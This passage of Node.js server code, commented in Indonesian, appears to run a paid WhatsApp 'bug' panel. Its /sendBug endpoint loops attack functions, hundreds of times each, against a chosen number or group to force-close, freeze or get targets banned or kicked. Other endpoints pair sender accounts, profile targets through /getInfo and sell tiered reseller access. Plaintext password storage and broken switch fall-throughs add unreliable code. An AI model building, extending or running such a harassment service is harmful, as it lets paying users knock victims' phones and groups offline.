      data: messages,
      items: messages
    });
  } catch (err) {
    console.error('[PUBLIC CHAT] GET /api/chat/messages:', err);
    return res.status(500).json({
      success: false,
      message: 'Gagal memuat chat public'
    });
  }
});

// POST /api/chat/send
// Accepts BOTH:
// { username, role, text }
// and legacy { username, role, message }
// Session key can be in body, X-Session-Key, or Authorization: Bearer ...
app.post('/api/chat/send', (req, res) => {
  try {
    const username = sanitizePublicChat(req.body?.username ?? req.body?.from);
    const role = sanitizePublicChat(req.body?.role ?? 'member');
    const text = sanitizePublicChat(req.body?.text ?? req.body?.message ?? req.body?.content);

    if (!text) {
      return res.status(400).json({
        success: false,
        valid: false,
        message: 'Message cannot be empty'
      });
    }

    const auth = authenticateChatRequest(req, username);
    if (!auth.ok) {
      return res.status(auth.status).json({
        success: false,
        valid: false,
        message: auth.message
      });
    }

    const chat = makePublicChatMessage({
      username: auth.username,
      role,
      text
    });

    publicChatList.push(chat);

    // Keep the room bounded.
    if (publicChatList.length > 1000) {
      publicChatList = publicChatList.slice(-1000);
    }

    savePublicChat();
    broadcastPublicChat(chat);

    return res.status(200).json({
      success: true,
      valid: true,
      status: 'sent',
      message: chat,
      data: chat
    });
  } catch (err) {
    console.error('[PUBLIC CHAT] POST /api/chat/send:', err);
    return res.status(500).json({
      success: false,
      valid: false,
      message: 'Gagal mengirim pesan'
    });
  }
});

// POST /api/chat/reaction
app.post('/api/chat/reaction', (req, res) => {
  try {
    const messageId = String(req.body?.messageId ?? '').trim();
    const emoji = String(req.body?.emoji ?? '').trim();
    const username = sanitizePublicChat(req.body?.username);

    if (!messageId || !emoji || !username) {
      return res.status(400).json({
        success: false,
        message: 'messageId, emoji, dan username wajib diisi'
      });
    }

    const allowedEmoji = new Set([
      '❤️','😂','😍','🔥','👍','👏','🎉','😮',
      '😢','😡','🤔','🙏','💯','✨','🥰','🤣',
      '😎','👀','💜','🚀','🙌','😭','🤩','🫶'
    ]);

    if (!allowedEmoji.has(emoji)) {
      return res.status(400).json({
        success: false,
        message: 'Emoji tidak didukung'
      });
    }

    const message = publicChatList.find(m => String(m.id) === messageId);
    if (!message) {
      return res.status(404).json({
        success: false,
        message: 'Pesan tidak ditemukan'
      });
    }

    if (!message.reactions || typeof message.reactions !== 'object') {
      message.reactions = {};
    }

    if (!Array.isArray(message.reactions[emoji])) {
      message.reactions[emoji] = [];
    }

    const users = message.reactions[emoji];
    const existingIndex = users.indexOf(username);

    if (existingIndex >= 0) {
      users.splice(existingIndex, 1);
    } else {
      users.push(username);
    }

    if (users.length === 0) {
      delete message.reactions[emoji];
    }

    savePublicChat();
    broadcastPublicChat(message);

    return res.json({
      success: true,
      message
    });
  } catch (err) {
    console.error('[PUBLIC CHAT] reaction:', err);
    return res.status(500).json({
      success: false,
      message: 'Gagal memproses reaksi'
    });
  }
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://files.catbox.moe/x3pdvk.jpg",
    title: "WELCOME EVERYONE",
    desc: "gatau"
  },
    {
    image: "https://files.catbox.moe/hbou2n.jpg",
    title: "UPDATE PREMIUM V6 MCLAREN",
    desc: "gatau"
  }
];

app.get("/getMyActivity", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const username = keyInfo.username;
  const userLogPath = path.join(LOGS_DIR, `${username}.json`);

  try {
    if (!fs.existsSync(userLogPath)) {
      return res.json({ valid: true, activities: [] });
    }

    const logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));

    logs.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ valid: true, activities: logs });
  } catch (err) {
    console.error("[GET LOGS ERROR]", err.message);
    return res.status(500).json({ valid: false, message: "Gagal mengambil log" });
  }
});

app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false });

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);

  if (existingSession) {
    const oldAndroid = existingSession.androidId;
    const newAndroid = androidId;

    if (oldAndroid !== newAndroid) {
      console.log(` LOGIN DITOLAK: ${username} | Device Lama: ${oldAndroid} | Device Baru: ${newAndroid}`);

      return res.json({
        valid: false,
        message: "Akun ini sedang login di perangkat lain. Silakan logout terlebih dahulu di perangkat lama."
      });
    }
  }

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  saveUserLog(
    username,
    "login",
    "Login Berhasil",
    `IP: ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip} | Device: ${androidId}`
  );

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news: news
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

// ================================================================
// 🚀 ENDPOINT SEND BUG - FULL VERSION WITH RICH NOTIFICATION
// ================================================================
app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  const senderMode = req.query.senderMode || 'private';

  console.log(`[SENDBUG] 📩 Request: key=${key}, bug=${bug}, target=${target}, mode=${senderMode}`);

  const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
  const isGroupLink = groupRegex.test(target || '');
  const isGroupJid = typeof target === 'string' && target.endsWith('@g.us');

  if (!isGroupLink && !isGroupJid) {
    target = (target || "").replace(/\D/g, "");
  }

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.warn(`[SENDBUG] ❌ Key tidak valid: ${key}`);
    return res.json({ valid: false, message: "Invalid key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.warn(`[SENDBUG] ❌ User tidak ditemukan: ${keyInfo.username}`);
    return res.json({ valid: false, message: "User not found" });
  }

  // ─── Cooldown ──────────────────────────────────────────────────
  const roleCooldowns = {
    owner_utama: 1, owner: 1, staff: 15, executorius: 3,
    forius_utama: 5, moderator: 10, ceo_utama: 4,
    tangan_kanan: 20, tangan_kiri: 25, developers: 2,
    partner_pribadi: 45, partner: 40, admin: 60,
    reseller: 290, tukang_bubur: 300, vip: 10, member: 250
  };

  const role = user?.role || "member";
  const cooldownSeconds = roleCooldowns[role] ?? 250;

  if (!user.lastSend) user.lastSend = 0;
  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({
      valid: true, sended: false,
      cooldown: true, wait: cooldownSeconds - diffSeconds,
    });
  }

  user.lastSend = now;
  saveDatabase(db);

  // ─── Response Awal ─────────────────────────────────────────────
  res.json({ valid: true, sended: true, cooldown: false, role });

  // ─── Eksekusi Bug di Background ────────────────────────────────
  setImmediate(async () => {
    try {
      saveUserLog(user.username, "bug",
        `Kirim Bug: ${bug.toUpperCase()}`,
        `Target: ${target} | Mode: ${senderMode} | Role: ${role}`
      );

      console.log(`[SENDBUG] 🔍 Mencari socket untuk ${user.username} (mode: ${senderMode})`);
      console.log(`[SENDBUG] 📊 activeConnections: ${Object.keys(activeConnections).length} session aktif`);

      let sock = null;

      // ─── Cari Socket ────────────────────────────────────────────
      if (senderMode === 'global') {
        const entries = Object.entries(activeConnections);
        if (entries.length === 0) {
          console.warn(`[SENDBUG] ❌ Global: tidak ada koneksi aktif.`);
          await notifyAdmin('Gagal Kirim Bug (Global)', {
            'Bug': bug,
            'Target': target,
            'User': user.username,
            'Role': role,
            'Mode': senderMode,
            'Penyebab': 'Tidak ada koneksi WhatsApp aktif'
          }, true);
          return;
        }
        sock = entries[Math.floor(Math.random() * entries.length)][1];
        console.log(`[SENDBUG] 🌍 Global sender. Total aktif: ${entries.length}`);
      } else if (user.role === 'vip') {
        let pool = [];
        const vipPath = path.join(__dirname, 'vip');
        const userPath = path.join(__dirname, 'permenmd', user.username);
        if (fs.existsSync(vipPath)) pool.push(...getActiveSocketsFromPath(vipPath));
        if (fs.existsSync(userPath)) pool.push(...getActiveSocketsFromPath(userPath));
        if (pool.length === 0) {
          console.warn(`[SENDBUG] ❌ VIP: tidak ada sock.`);
          await notifyAdmin('Gagal Kirim Bug (VIP)', {
            'Bug': bug,
            'Target': target,
            'User': user.username,
            'Role': role,
            'Mode': senderMode,
            'Penyebab': 'Tidak ada socket VIP tersedia'
          }, true);
          return;
        }
        sock = pool[Math.floor(Math.random() * pool.length)];
        console.log(`[SENDBUG] 👑 VIP pool. Total: ${pool.length}`);
      } else {
        sock = await checkActiveSessionInFolder(user.username);
        if (!sock) {
          console.warn(`[SENDBUG] ❌ Private: tidak ada sock untuk ${user.username}.`);
          await notifyAdmin('Gagal Kirim Bug (Private)', {
            'Bug': bug,
            'Target': target,
            'User': user.username,
            'Role': role,
            'Mode': senderMode,
            'Penyebab': 'Tidak ada socket private untuk user ini'
          }, true);
          return;
        }
        console.log(`[SENDBUG] 🔒 Private: ${user.username}`);
      }

      if (!sock) {
        console.error(`[SENDBUG] ❌ Socket null!`);
        await notifyAdmin('Gagal Kirim Bug (Socket Null)', {
          'Bug': bug,
          'Target': target,
          'User': user.username,
          'Role': role,
          'Mode': senderMode,
          'Penyebab': 'Socket yang didapat tidak valid'
        }, true);
        return;
      }

      // ─── Kirim Bug dengan Retry ─────────────────────────────────
      const success = await sendBugWithRetry(sock, bug, target, isGroupLink, isGroupJid, groupRegex, user, 0);

      if (success) {
        console.log(`[SENDBUG] ✅ Bug '${bug}' berhasil dikirim ke ${target}`);
        await notifyAdmin('Bug Berhasil Dikirim', {
          'Bug': bug,
          'Target': target,
          'User': user.username,
          'Role': role,
          'Mode': senderMode,
          'Status': '✅ Sukses'
        }, false);
      } else {
        console.warn(`[SENDBUG] ❌ Gagal kirim '${bug}' ke ${target} setelah 3 kali percobaan`);
        await notifyAdmin('Gagal Kirim Bug (Max Retry)', {
          'Bug': bug,
          'Target': target,
          'User': user.username,
          'Role': role,
          'Mode': senderMode,
          'Penyebab': 'Gagal setelah 3 kali percobaan'
        }, true);
      }

    } catch (err) {
      console.error(`[SENDBUG] 💥 Fatal error:`, err.message);
      await notifyAdmin('Error Fatal Kirim Bug', {
        'Bug': bug,
        'Target': target,
        'User': user.username,
        'Role': role,
        'Mode': senderMode,
        'Error': err.message
      }, true);
    }
  });
});

// ================================================================
// 🔄 FUNGSI KIRIM BUG DENGAN RETRY
// ================================================================
async function sendBugWithRetry(sock, bug, target, isGroupLink, isGroupJid, groupRegex, user, retryCount) {
  const maxRetries = 3;
  let sessionName = null;
  let targetJid = "";

  try {
    // Cari nama session
    for (const [k, v] of Object.entries(activeConnections)) {
      if (v === sock) { sessionName = k; break; }
    }

    // ─── Parse target JID ──────────────────────────────────────
    if (isGroupLink) {
      const inviteCode = target.match(groupRegex)[1];
      console.log(`[SENDBUG] 📎 Invite code: ${inviteCode}`);
      let groupInfo;
      try {
        groupInfo = await sock.groupGetInviteInfo(inviteCode);
      } catch (e) {
        throw new Error("Invite group invalid / expired");
      }
      targetJid = groupInfo.id;
      try {
        await sock.groupAcceptInvite(inviteCode);
        console.log(`[SENDBUG] ✅ Join group: ${targetJid}`);
      } catch {
        console.log(`[SENDBUG] ℹ️ Already joined or unable to join`);
      }
    } else if (isGroupJid) {
      targetJid = target;
    } else {
      targetJid = target.replace(/\D/g, "") + "@s.whatsapp.net";
    }

    console.log(`[SENDBUG] 🎯 JID target: ${targetJid}`);

    // ─── EKSEKUSI BUG ──────────────────────────────────────────
    switch (bug) {
      case "frezemclaren":
        for (let i = 0; i < 103; i++) {
          await frezemclaren(sock, targetJid);
          await sleep(1000);
        }
        break;
      case "forclose_new":
        for (let i = 0; i < 1000; i++) {
          await FcNew(sock, targetJid);
          await sleep(1000);
        }
        break;
      case "delayhard":
        for (let i = 0; i < 800; i++) {
          await DelayHard(sock, targetJid);
          await sleep(1000);
        }
        break;
      case "delayxblank":
        for (let i = 0; i < 100; i++) {
          await AudioXDellay(sock, targetJid);
          await sleep(1000);
        }
        break;
      case "crashandro":
        for (let i = 0; i < 900; i++) {
          await jmk(sock, targetJid);
          await sleep(1000);
        }
        break;
      case "fcbokep":
        for (let i = 0; i < 450; i++) {
          await FcBokepJepang(sock, targetJid);
          await sleep(1000);
        }
        break;
      case "delayhardmclaren":
        for (let i = 0; i < 450; i++) {
          await delayhardmclaren(sock, targetJid);
          await sleep(1000);
        }
        break;
      case "delaymclaren":
        for (let i = 0; i < 100; i++) {
          await delayinvisblemclaren(sock, targetJid);
          await sleep(1000);
        }
        break;
      case "blankmclaren":
        for (let i = 0; i < 20; i++) {
          await blankmclaren(sock, targetJid);
          await sleep(1000);
        }
        break;
      case "forclosemclaren":
        for (let i = 0; i < 1; i++) {
          await fcmclaren(sock, targetJid);
          await sleep(1000);
        }
        break;
      case "band-group":
            for (let i = 0; i < 196; i++) {
             await BanGroupNew(sock, targetJid);            
             await sleep(5); 
        }
        case "banGb":
            for (let i = 0; i < 250; i++) {
             await bandGroupWork(sock, groupJid);                      await BanGroupNew(sock,  targetJid);
             await sleep(5); 
        }
        case "kudet-group":
        for (let i = 0; i < 50; i++) {
          await iXKudetakick(sock, targetJid);
          await sleep(20);
        }
        case "blank-group":
            for (let i = 0; i < 180; i++) {
             await BlankGroup(sock, groupJid);            
             await sleep(1000); 
        }
        case "delay-group":
            for (let i = 0; i < 900; i++) {
             await CriticalRyu(sock, targetJid);            
             await sleep(1500); 
        }
        case "band-group2":
            for (let i = 0; i < 802; i++) {
             await groupBanRXT(sock, groupJid);         
             await sleep(3); 
        }
        break;
          case "mclarenfc":
    for (let i = 0; i < 530; i++) {
      await MclarenFC(sock, targetJid);
      await sleep(3000);
    }
    break;
  case "maentance":
    for (let i = 0; i < 25; i++) {
      await maentance(sock, targetJid);
      await sleep(1000);
    }
    break;
  default:
    console.warn(`[SENDBUG] ❌ Bug tidak dikenal: ${bug}`);
    return false;
}

    console.log(`[SENDBUG] ✅ '${bug}' terkirim ke ${targetJid}`);
    return true;

  } catch (err) {
    console.warn(`[SENDBUG] ⚠️ Error attempt ${retryCount+1}/${maxRetries}: ${err.message}`);

    // Jika connection closed, hapus session
    if (sessionName && (err.message === 'Connection Closed' || err.message.includes('Connection'))) {
      delete activeConnections[sessionName];
      console.log(`[SENDBUG] 🗑️ Session ${sessionName} dihapus (connection closed)`);
    }

    // Retry jika belum mencapai batas
    if (retryCount < maxRetries - 1) {
      console.log(`[SENDBUG] 🔄 Mencoba socket lain... (${retryCount+1}/${maxRetries})`);
      let newSock = null;
      if (user.role === 'vip') {
        let pool = [];
        const vipPath = path.join(__dirname, 'vip');
        const userPath = path.join(__dirname, 'permenmd', user.username);
        if (fs.existsSync(vipPath)) pool.push(...getActiveSocketsFromPath(vipPath));
        if (fs.existsSync(userPath)) pool.push(...getActiveSocketsFromPath(userPath));
        if (pool.length > 0) newSock = pool[Math.floor(Math.random() * pool.length)];
      } else {
        newSock = await checkActiveSessionInFolder(user.username);
      }
      if (newSock) {
        return await sendBugWithRetry(newSock, bug, target, isGroupLink, isGroupJid, groupRegex, user, retryCount + 1);
      } else {
        console.warn(`[SENDBUG] ❌ Tidak ada socket cadangan.`);
      }
    }

    return false;
  }
}

function analyzeError(error) {
    const stack = error.stack || error.message || '';
    let analysis = {
        type: 'Unknown',
        location: 'Unknown',
        cause: 'Unknown',
        suggestion: 'Periksa log server.'
    };

    if (stack.includes('Connection Closed') || stack.includes('connection closed')) {
        analysis.type = 'Connection Closed';
        analysis.location = 'Socket/Connection';
        analysis.cause = 'Koneksi WhatsApp terputus atau socket tidak valid.';
        analysis.suggestion = 'Pastikan session WhatsApp aktif. Gunakan /mySender untuk cek status.';
    } else if (stack.includes('Timeout') || stack.includes('timed out')) {
        analysis.type = 'Timeout';
        analysis.location = 'Network/Request';
        analysis.cause = 'Server tidak merespon dalam batas waktu.';
        analysis.suggestion = 'Cek koneksi internet dan coba lagi. Periksa apakah server overload.';
    } else if (stack.includes('groupParticipantsUpdate') || stack.includes('group')) {
        analysis.type = 'Group Operation Failed';
        analysis.location = 'WhatsApp Group API';
        analysis.cause = 'Gagal mengupdate partisipan grup (add/remove/demote).';
        analysis.suggestion = 'Pastikan bot adalah admin grup. Cek apakah grup masih aktif.';
    } else if (stack.includes('sendMessage') || stack.includes('relayMessage')) {
        analysis.type = 'Send Message Failed';
        analysis.location = 'WhatsApp Messaging API';
        analysis.cause = 'Gagal mengirim pesan ke grup atau target.';
        analysis.suggestion = 'Cek apakah target valid dan bot tidak di-block.';
    } else if (stack.includes('profilePictureUrl') || stack.includes('fetchStatus')) {
        analysis.type = 'Profile Fetch Failed';
        analysis.location = 'WhatsApp Profile API';
        analysis.cause = 'Gagal mengambil foto profil atau status.';
        analysis.suggestion = 'Target mungkin tidak memiliki foto profil atau status.';
    } else if (stack.includes('cooldown') || stack.includes('Cooldown')) {
        analysis.type = 'Cooldown Active';
        analysis.location = 'Rate Limiting';
        analysis.cause = 'User masih dalam masa cooldown.';
        analysis.suggestion = 'Tunggu beberapa saat sebelum mengirim bug lagi.';
    } else if (stack.includes('Invalid key') || stack.includes('session key')) {
        analysis.type = 'Invalid Session';
        analysis.location = 'Authentication';
        analysis.cause = 'Session key tidak valid atau expired.';
        analysis.suggestion = 'Login ulang untuk mendapatkan session key baru.';
    }

    return analysis;
}

function sendErrorReport(chatId, error, context) {
    const analysis = analyzeError(error);
    const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    const errorLog = `🚨 ERROR REPORT\n━━━━━━━━━━━━━━━━━━\n📅 Waktu: ${timestamp}\n📌 Tipe: ${analysis.type}\n📍 Lokasi: ${analysis.location}\n⚠️ Penyebab: ${analysis.cause}\n💡 Saran: ${analysis.suggestion}\n━━━━━━━━━━━━━━━━━━\n📝 Stack Trace:\n${error.stack || error.message || 'Tidak ada stack trace'}\n━━━━━━━━━━━━━━━━━━\n📦 Konteks: ${JSON.stringify(context, null, 2)}`;

    const fileName = `error_${Date.now()}.txt`;
    const filePath = path.join(__dirname, 'logs', fileName);

    if (!fs.existsSync(path.join(__dirname, 'logs'))) {
        fs.mkdirSync(path.join(__dirname, 'logs'), { recursive: true });
    }

    fs.writeFileSync(filePath, errorLog);

    bot.sendRichMessage({
        type: 'document',
        chatId: chatId,
        media: filePath,
        options: {
            caption: `📄 **Error Log**\n\n📌 **Tipe:** ${analysis.type}\n📍 **Lokasi:** ${analysis.location}\n⚠️ **Penyebab:** ${analysis.cause}\n💡 **Saran:** ${analysis.suggestion}\n\nKlik tombol di bawah untuk analisis lebih lanjut.`,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🔍 Cari Tahu Error', callback_data: `error_analyze_${fileName}`, style: 'primary' },
                        { text: '🗑️ Hapus Info', callback_data: `error_delete_${fileName}`, style: 'danger' }
                    ]
                ]
            }
        }
    }).catch(() => {
        bot.sendRichMessage(chatId, `❌ Gagal mengirim file error. Silakan cek log server.`, { parse_mode: 'HTML' });
    });
}

// ================================================================
// 📨 NOTIFIKASI ADMIN (RICH PANEL + TABLE)
// ================================================================
async function notifyAdmin(title, details, isError = true) {
    try {
        // Pastikan details adalah object
        if (!details || typeof details !== 'object') {
            details = { 'Info': 'Tidak ada detail' };
        }

        // Konversi details ke array untuk richPanel
        const rows = Object.entries(details).map(([key, value]) => {
            let displayValue = String(value ?? '-');
            if (displayValue.length > 80) {
                displayValue = displayValue.substring(0, 80) + '...';
            }
            return [key, displayValue];
        });

        // Build rich panel dengan format yang sudah ada
        const panel = richPanel(
            isError ? `🚨 ${title}` : `📢 ${title}`,
            rows,
            isError 
                ? '⚠️ Silakan periksa log server untuk detail lebih lanjut.' 
                : '✅ Notifikasi berhasil dikirim.'
        );

        // Kirim ke admin group
        await bot.sendRichMessage(ADMIN_GROUP_ID, panel, { parse_mode: "HTML" });
        console.log(`[NOTIFY] ✅ Notifikasi dikirim ke admin group: ${title}`);
    } catch (e) {
        console.error(`[NOTIFY] ❌ Gagal kirim notifikasi: ${e.message}`);
    }
}


function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

app.get("/getActiveSenders", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, senders: [] });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, senders: [] });

  if (!['owner', 'vip','admin'].includes(user.role)) {
    return res.json({ valid: false, senders: [] });
  }

  const senders = Object.keys(activeConnections);
  res.json({ valid: true, senders });
});

app.get("/getSenderStats", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const username = keyInfo.username;
  const baseDir = 'permenmd';
  let privateCount = 0;
  let globalCount = 0;

  try {
    const userPath = path.join(__dirname, baseDir, username);
    if (fs.existsSync(userPath)) {
      const files = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      files.forEach(f => {
        const sessionName = path.basename(f, ".json");
        if (activeConnections[sessionName]) privateCount++;
      });
    }

    if (fs.existsSync(baseDir)) {
      const allUsers = fs.readdirSync(baseDir).filter(p => {
        const pPath = path.join(baseDir, p);
        return fs.lstatSync(pPath).isDirectory();
      });

      allUsers.forEach(u => {
        const uPath = path.join(baseDir, u);
        if (fs.existsSync(uPath)) {
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) globalCount++;
          });
        }
      });
    }

    res.json({
      valid: true,
      private: privateCount,
      global: globalCount
    });
  } catch (err) {
    console.error("[STATS ERROR]", err.message);
    res.status(500).json({ valid: false, error: "Server Error" });
  }
});

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  let conns = [];

  if (user.role === 'vip') {
    console.log(`[${user.username}] Request mySender (VIP Mode: VIP Pool + Personal)`);

    const vipPath = path.join(__dirname, 'vip');
    if (fs.existsSync(vipPath)) {
      const vipFiles = fs.readdirSync(vipPath).filter(f => f.endsWith(".json"));
      vipFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'vip' });
        }
      });
    }

    const userPath = path.join('permenmd', user.username);
    if (fs.existsSync(userPath)) {
      const userFiles = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      userFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'personal' });
        }
      });
    }

  } else {
    console.log(`[${user.username}] Request mySender (Member Mode)`);
    conns = getActiveCredsInFolder(user.username);
  }

  return res.json({
    valid: true,
    connections: conns
  });
});

const connectVipSessions = async () => {
  const vipPath = path.join(__dirname, 'vip');
  if (!fs.existsSync(vipPath)) {
    console.log(`[] Folder vip/ tidak ditemukan, skip.`);
    return;
  }

  const sessions = fs.readdirSync(vipPath).filter(name =>
    fs.statSync(path.join(vipPath, name)).isDirectory()
  );

  console.log(`[] VIP sessions ditemukan: ${sessions.length}`);

  await Promise.all(
    sessions.map(sessionName => {
      if (activeConnections[sessionName]) {
        console.log(`[] VIP ${sessionName} sudah aktif, skip`);
        return Promise.resolve();
      }
      return connectSession(vipPath, sessionName);
    })
  );

  console.log(`[] Semua VIP session selesai diproses.`);
};

app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query
  const keyInfo = activeKeys[key]
  if (!keyInfo) return res.json({ valid: false })

  const db = loadDatabase()
  const user = db.find(u => u.username === keyInfo.username)
  if (!user) return res.status(401).json({ error: "Invalid session key" })
  if (!number) return res.status(400).json({ error: "Number is required" })

  try {
    const baseDir = path.join("permenmd", user.username)
    const sessionDir = path.join(baseDir, number)

    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true })
    }

    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir, { recursive: true })
    }

    fs.mkdirSync(sessionDir, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    })

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "close") {
        const isLoggedOut =
          lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut
        if (!isLoggedOut) {
          await waiting(3000)
          await pairingWa(number, user.username)
        } else {
          delete activeConnections[number]
        }
      }
    })

    if (!sock.authState.creds.registered) {
      await waiting(1200)
      const code = await sock.requestPairingCode(number, "MCLARENA")
      if (code) {
        return res.json({ valid: true, number, pairingCode: code })
      }
      return res.json({ valid: false })
    }

    return res.json({ valid: false })
  } catch (err) {
    return res.status(500).json({ error: err.message })
  }
})

app.get("/cakun", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[ CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  const allowedCreatorRoles = [
  "owner_utama",
  "owner",
  "staff",
  "executorius",
  "forius_utama",
  "moderator",
  "ceo_utama",
  "tangan_kanan",
  "tangan_kiri",
  "developers",
  "partner_pribadi",
  "partner",
  "admin",
  "reseller"
];

if (!creator || !allowedCreatorRoles.includes(creator.role)) {
